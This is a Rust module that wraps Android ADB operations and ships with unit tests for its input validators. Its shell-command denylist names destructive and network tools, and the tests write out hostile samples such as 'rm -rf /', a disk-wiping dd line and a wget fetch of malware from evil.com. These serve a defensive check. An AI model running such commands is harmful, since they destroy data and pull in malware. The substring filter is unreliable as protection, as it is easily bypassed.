use std::path::PathBuf;
use std::process::Command;
use anyhow::{Result, Context};

/// ADB Device
#[derive(Debug, Clone)]
pub struct Device {
    /// Serial number (e.g., "emulator-5554" or "ABC123")
    pub serial: String,
    /// Device state (device, offline, unauthorized)
    pub state: String,
    /// Device model (from ro.product.model)
    pub model: Option<String>,
    /// Android version (from ro.build.version.release)
    pub android_version: Option<String>,
    /// API level (from ro.build.version.sdk)
    pub api_level: Option<i32>,
}

/// Dangerous shell command patterns that should be blocked
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf",
    "dd if=",
    "mkfs",
    ":(){ :|:& };:",  // Fork bomb
    "chmod 777",
    "> /dev/sd",
    "wget",
    "curl -o",
    "nc -l",
    "/dev/null",
];

/// Validate shell command for dangerous patterns
fn validate_shell_command(cmd: &str) -> Result<()> {
    // Check for dangerous patterns
    for pattern in DANGEROUS_PATTERNS {
        if cmd.contains(pattern) {
            return Err(anyhow::anyhow!(
                "Command contains potentially dangerous pattern: '{}'. If this is intentional, use the device shell directly.",
                pattern
            ));
        }
    }

    // Check for shell injection attempts
    if cmd.contains(';') && (cmd.contains("rm") || cmd.contains("reboot") || cmd.contains("format")) {
        return Err(anyhow::anyhow!("Command appears to contain shell injection attempt"));
    }

    // Check for pipe to dangerous commands
    if cmd.contains('|') && cmd.split('|').any(|part| {
        let trimmed = part.trim();
        trimmed.starts_with("rm") ||
        trimmed.starts_with("dd") ||
        trimmed.contains("/dev/sd")
    }) {
        return Err(anyhow::anyhow!("Command pipes to potentially dangerous operation"));
    }

    Ok(())
}

/// Validate package name format
fn validate_package_name(package: &str) -> Result<()> {
    // Package names should be valid Java package identifiers
    if package.is_empty() {
        return Err(anyhow::anyhow!("Package name cannot be empty"));
    }

    if package.len() > 512 {
        return Err(anyhow::anyhow!("Package name too long"));
    }

    // Check for valid characters
    for c in package.chars() {
        if !c.is_alphanumeric() && c != '.' && c != '_' && c != '-' {
            return Err(anyhow::anyhow!("Package name contains invalid character: '{}'", c));
        }
    }

    Ok(())
}

/// Validate serial number format
fn validate_serial(serial: &str) -> Result<()> {
    if serial.is_empty() {
        return Err(anyhow::anyhow!("Serial number cannot be empty"));
    }

    if serial.len() > 128 {
        return Err(anyhow::anyhow!("Serial number too long"));
    }

    // Check for valid characters
    for c in serial.chars() {
        if !c.is_alphanumeric() && c != '-' && c != '_' && c != ':' && c != '.' {
            return Err(anyhow::anyhow!("Serial contains invalid character: '{}'", c));
        }
    }

    Ok(())
}

/// ADB Service for device operations
pub struct AdbService {
    adb_path: PathBuf,
}

impl AdbService {
    pub fn new(sdk_path: &PathBuf) -> Result<Self> {
        let adb_path = sdk_path.join("platform-tools").join("adb");

        if !adb_path.exists() {
            return Err(anyhow::anyhow!(
                "ADB not found at {}. Install platform-tools first.",
                adb_path.display()
            ));
        }

        Ok(Self { adb_path })
    }

    /// Start ADB server
    pub fn start_server(&self) -> Result<()> {
        let output = Command::new(&self.adb_path)
            .arg("start-server")
            .output()
            .context("Failed to start ADB server")?;

        if !output.status.success() {
            return Err(anyhow::anyhow!("ADB server failed to start"));
        }

        Ok(())
    }

    /// Kill ADB server
    pub fn kill_server(&self) -> Result<()> {
        Command::new(&self.adb_path)
            .arg("kill-server")
            .output()
            .context("Failed to kill ADB server")?;

        Ok(())
    }

    /// List connected devices
    pub fn devices(&self) -> Result<Vec<Device>> {
        self.start_server()?;

        let output = Command::new(&self.adb_path)
            .arg("devices")
            .arg("-l")
            .output()
            .context("Failed to list devices")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let mut devices = Vec::new();

        for line in stdout.lines().skip(1) {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                let serial = parts[0].to_string();
                let state = parts[1].to_string();

                // Parse additional info
                let model = parts.iter()
                    .find(|p| p.starts_with("model:"))
                    .map(|p| p.split(':').nth(1).unwrap_or("unknown").to_string());

                let device = Device {
                    serial,
                    state,
                    model,
                    android_version: None,
                    api_level: None,
                };

                devices.push(device);
            }
        }

        Ok(devices)
    }

    /// Get device properties
    pub fn get_device_info(&self, serial: &str) -> Result<Device> {
        let model = self.get_prop(serial, "ro.product.model")?;
        let android_version = self.get_prop(serial, "ro.build.version.release")?;
        let api_level = self.get_prop(serial, "ro.build.version.sdk")?
            .and_then(|v| v.parse::<i32>().ok());

        Ok(Device {
            serial: serial.to_string(),
            state: "device".to_string(),
            model,
            android_version,
            api_level,
        })
    }

    /// Get system property
    fn get_prop(&self, serial: &str, prop: &str) -> Result<Option<String>> {
        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("shell").arg("getprop").arg(prop)
            .output()?;

        if output.status.success() {
            let value = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if value.is_empty() {
                Ok(None)
            } else {
                Ok(Some(value))
            }
        } else {
            Ok(None)
        }
    }

    /// Execute shell command on device (with security validation)
    pub fn shell(&self, serial: &str, cmd: &str) -> Result<String> {
        validate_serial(serial)?;
        validate_shell_command(cmd)?;

        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("shell").arg(cmd)
            .output()
            .with_context(|| format!("Failed to execute shell command: {}", cmd))?;

        if !output.status.success() {
            return Err(anyhow::anyhow!(
                "Shell command failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ));
        }

        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    }

    /// Install APK on device
    pub fn install(&self, serial: &str, apk_path: &PathBuf) -> Result<()> {
        println!("Installing {} on {}...", apk_path.display(), serial);

        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("install")
            .arg("-r") // Replace existing
            .arg(apk_path)
            .output()
            .context("Failed to install APK")?;

        if !output.status.success() {
            return Err(anyhow::anyhow!(
                "APK installation failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ));
        }

        let stdout = String::from_utf8_lossy(&output.stdout);
        if stdout.contains("Success") {
            println!("Successfully installed {}", apk_path.display());
            Ok(())
        } else {
            Err(anyhow::anyhow!("Installation failed: {}", stdout))
        }
    }

    /// Install multiple APKs (split APK)
    pub fn install_multiple(&self, serial: &str, apk_paths: &[PathBuf]) -> Result<()> {
        println!("Installing {} APKs on {}...", apk_paths.len(), serial);

        let mut cmd = Command::new(&self.adb_path);
        cmd.arg("-s").arg(serial)
            .arg("install-multiple")
            .arg("-r");

        for apk in apk_paths {
            cmd.arg(apk);
        }

        let output = cmd.output()
            .context("Failed to install multiple APKs")?;

        if !output.status.success() {
            return Err(anyhow::anyhow!(
                "Multiple APK installation failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ));
        }

        let stdout = String::from_utf8_lossy(&output.stdout);
        if stdout.contains("Success") {
            println!("Successfully installed {} APKs", apk_paths.len());
            Ok(())
        } else {
            Err(anyhow::anyhow!("Installation failed: {}", stdout))
        }
    }

    /// Uninstall package from device
    pub fn uninstall(&self, serial: &str, package: &str) -> Result<()> {
        validate_serial(serial)?;
        validate_package_name(package)?;

        println!("Uninstalling {} from {}...", package, serial);

        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("uninstall").arg(package)
            .output()
            .context("Failed to uninstall package")?;

        if !output.status.success() {
            return Err(anyhow::anyhow!(
                "Uninstall failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ));
        }

        let stdout = String::from_utf8_lossy(&output.stdout);
        if stdout.contains("Success") {
            println!("Successfully uninstalled {}", package);
            Ok(())
        } else {
            Err(anyhow::anyhow!("Uninstall failed: {}", stdout))
        }
    }

    /// Forward port
    pub fn forward(&self, serial: &str, local: &str, remote: &str) -> Result<()> {
        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("forward").arg(local).arg(remote)
            .output()
            .context("Failed to forward port")?;

        if !output.status.success() {
            return Err(anyhow::anyhow!(
                "Port forward failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ));
        }

        println!("Forwarded {} -> {} on {}", local, remote, serial);
        Ok(())
    }

    /// Remove forward
    pub fn forward_remove(&self, serial: &str, local: &str) -> Result<()> {
        Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("forward").arg("--remove").arg(local)
            .output()
            .context("Failed to remove forward")?;

        Ok(())
    }

    /// Push file to device
    pub fn push(&self, serial: &str, local: &PathBuf, remote: &str) -> Result<()> {
        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("push").arg(local).arg(remote)
            .output()
            .context("Failed to push file")?;

        if !output.status.success() {
            return Err(anyhow::anyhow!(
                "Push failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ));
        }

        Ok(())
    }

    /// Pull file from device
    pub fn pull(&self, serial: &str, remote: &str, local: &PathBuf) -> Result<()> {
        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("pull").arg(remote).arg(local)
            .output()
            .context("Failed to pull file")?;

        if !output.status.success() {
            return Err(anyhow::anyhow!(
                "Pull failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ));
        }

        Ok(())
    }

    /// Read file from device and return contents
    pub fn read_file(&self, serial: &str, remote_path: &str) -> Result<String> {
        validate_serial(serial)?;

        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("shell").arg("cat").arg(remote_path)
            .output()
            .with_context(|| format!("Failed to read file: {}", remote_path))?;

        if !output.status.success() {
            return Err(anyhow::anyhow!(
                "Read file failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ));
        }

        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    }

    /// Execute UIAutomator dump and return XML content
    pub fn ui_dump(&self, serial: &str) -> Result<String> {
        validate_serial(serial)?;

        let remote_path = "/sdcard/window_dump.xml";

        // Execute UIAutomator dump
        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("shell").arg("uiautomator").arg("dump").arg("--compressed").arg(remote_path)
            .output()
            .context("Failed to dump UI hierarchy")?;

        // If compressed fails, try without compressed for older devices
        if !output.status.success() {
            let fallback_output = Command::new(&self.adb_path)
                .arg("-s").arg(serial)
                .arg("shell").arg("uiautomator").arg("dump").arg(remote_path)
                .output()
                .context("Failed to dump UI hierarchy (fallback)")?;

            if !fallback_output.status.success() {
                return Err(anyhow::anyhow!(
                    "UIAutomator dump failed: {}",
                    String::from_utf8_lossy(&fallback_output.stderr)
                ));
            }
        }

        // Read the dump file
        self.read_file(serial, remote_path)
    }

    /// Take screenshot from device
    pub fn screenshot(&self, serial: &str, local_path: &PathBuf) -> Result<()> {
        validate_serial(serial)?;

        let remote_path = "/sdcard/screenshot.png";

        // Take screenshot on device
        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("shell").arg("screencap").arg("-p").arg(remote_path)
            .output()
            .context("Failed to take screenshot")?;

        if !output.status.success() {
            return Err(anyhow::anyhow!(
                "Screenshot failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ));
        }

        // Pull the screenshot to local path
        self.pull(serial, remote_path, local_path)?;

        // Cleanup remote file
        Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("shell").arg("rm").arg(remote_path)
            .output()?;

        Ok(())
    }

    /// Capture screenshot directly to local file (without intermediate remote file)
    pub fn screenshot_direct(&self, serial: &str, local_path: &PathBuf) -> Result<()> {
        validate_serial(serial)?;

        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("exec-out").arg("screencap").arg("-p")
            .output()
            .context("Failed to capture screenshot")?;

        if !output.status.success() {
            return Err(anyhow::anyhow!(
                "Screenshot capture failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ));
        }

        std::fs::write(local_path, &output.stdout)
            .with_context(|| format!("Failed to write screenshot to {}", local_path.display()))?;

        Ok(())
    }

    /// Launch activity
    pub fn launch_activity(&self, serial: &str, package: &str, activity: &str) -> Result<()> {
        let intent = format!("{}/{}", package, activity);

        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("shell").arg("am").arg("start")
            .arg("-n").arg(&intent)
            .output()
            .context("Failed to launch activity")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        if stdout.contains("Starting") || stdout.contains("Error") {
            println!("Launched {}", intent);
            Ok(())
        } else {
            Err(anyhow::anyhow!("Failed to launch activity: {}", stdout))
        }
    }

    /// Get package path on device
    pub fn get_package_path(&self, serial: &str, package: &str) -> Result<Option<String>> {
        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("shell").arg("pm").arg("path").arg(package)
            .output()?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        if stdout.contains("package:") {
            let path = stdout.trim().replace("package:", "");
            Ok(Some(path))
        } else {
            Ok(None)
        }
    }

    /// Launch app using monkey (more reliable than am start)
    /// Monkey launches the default launchable activity
    pub fn monkey_launch(&self, serial: &str, package: &str) -> Result<()> {
        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("shell").arg("monkey")
            .arg("-p").arg(package)
            .arg("-c").arg("android.intent.category.LAUNCHER")
            .arg("1")
            .output()
            .context("Failed to launch app with monkey")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        if stdout.contains("Events injected") {
            println!("Launched {} (using monkey)", package);
            Ok(())
        } else {
            Err(anyhow::anyhow!("Failed to launch app: {}", stdout))
        }
    }

    /// Get list of installed packages matching a pattern
    pub fn list_packages(&self, serial: &str, filter: Option<&str>) -> Result<Vec<String>> {
        let mut cmd = Command::new(&self.adb_path);
        cmd.arg("-s").arg(serial)
            .arg("shell").arg("pm").arg("list").arg("packages");

        if let Some(f) = filter {
            cmd.arg(f);
        }

        let output = cmd.output()?;
        let stdout = String::from_utf8_lossy(&output.stdout);

        let packages: Vec<String> = stdout.lines()
            .filter(|l| l.starts_with("package:"))
            .map(|l| l.replace("package:", "").trim().to_string())
            .collect();

        Ok(packages)
    }

    /// Get launchable activity for a package using dumpsys
    pub fn get_launchable_activity(&self, serial: &str, package: &str) -> Result<Option<String>> {
        let output = Command::new(&self.adb_path)
            .arg("-s").arg(serial)
            .arg("shell").arg("cmd").arg("package")
            .arg("resolve-activity")
            .arg("--brief")
            .arg("-a").arg("android.intent.action.MAIN")
            .arg("-c").arg("android.intent.category.LAUNCHER")
            .arg(package)
            .output()?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        // Output format: "Activity name: com.package/com.package.Activity"
        for line in stdout.lines() {
            if line.contains("Activity name:") {
                let activity = line.split(':').nth(1)
                    .map(|s| s.trim().to_string());
                return Ok(activity);
            }
        }

        Ok(None)
    }
}
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_shell_command_safe() {
        assert!(validate_shell_command("ls").is_ok());
        assert!(validate_shell_command("cat /proc/version").is_ok());
        assert!(validate_shell_command("pm list packages").is_ok());
        assert!(validate_shell_command("am start -n com.test/.MainActivity").is_ok());
    }

    #[test]
    fn test_validate_shell_command_dangerous_rm() {
        assert!(validate_shell_command("rm -rf /data").is_err());
        assert!(validate_shell_command("rm -rf /*").is_err());
    }

    #[test]
    fn test_validate_shell_command_dangerous_dd() {
        assert!(validate_shell_command("dd if=/dev/zero of=/dev/sda").is_err());
    }

    #[test]
    fn test_validate_shell_command_dangerous_wget() {
        assert!(validate_shell_command("wget http://evil.com/malware.sh").is_err());
    }

    #[test]
    fn test_validate_shell_command_injection() {
        assert!(validate_shell_command("ls; rm -rf /").is_err());
        assert!(validate_shell_command("cat file; reboot").is_err());
    }

    #[test]
    fn test_validate_shell_command_pipe_dangerous() {
        assert!(validate_shell_command("cat file | rm data").is_err());
        assert!(validate_shell_command("ls | dd if=/dev/zero").is_err());
    }

    #[test]
    fn test_validate_shell_command_pipe_safe() {
        assert!(validate_shell_command("ls | grep test").is_ok());
        assert!(validate_shell_command("cat file | head -10").is_ok());
    }

    #[test]
    fn test_validate_package_name_valid() {
        assert!(validate_package_name("com.example.app").is_ok());
        assert!(validate_package_name("com.test.my_app").is_ok());
        assert!(validate_package_name("android-cli-test").is_ok());
    }

    #[test]
    fn test_validate_package_name_empty() {
        assert!(validate_package_name("").is_err());
    }

    #[test]
    fn test_validate_package_name_too_long() {
        let long_name = "a".repeat(600);
        assert!(validate_package_name(&long_name).is_err());
    }

    #[test]
    fn test_validate_package_name_invalid_chars() {
        assert!(validate_package_name("com/example/app").is_err());
        assert!(validate_package_name("com.example@app").is_err());
        assert!(validate_package_name("com.example.app!").is_err());
    }

    #[test]
    fn test_validate_serial_valid() {
        assert!(validate_serial("emulator-5554").is_ok());
        assert!(validate_serial("ABC123DEF456").is_ok());
        assert!(validate_serial("192.168.1.1:5555").is_ok());
    }

    #[test]
    fn test_validate_serial_empty() {
        assert!(validate_serial("").is_err());
    }

    #[test]
    fn test_validate_serial_too_long() {
        let long_serial = "a".repeat(150);
        assert!(validate_serial(&long_serial).is_err());
    }

    #[test]
    fn test_validate_serial_invalid_chars() {
        assert!(validate_serial("serial with spaces").is_err());
        assert!(validate_serial("serial/invalid").is_err());
    }
}
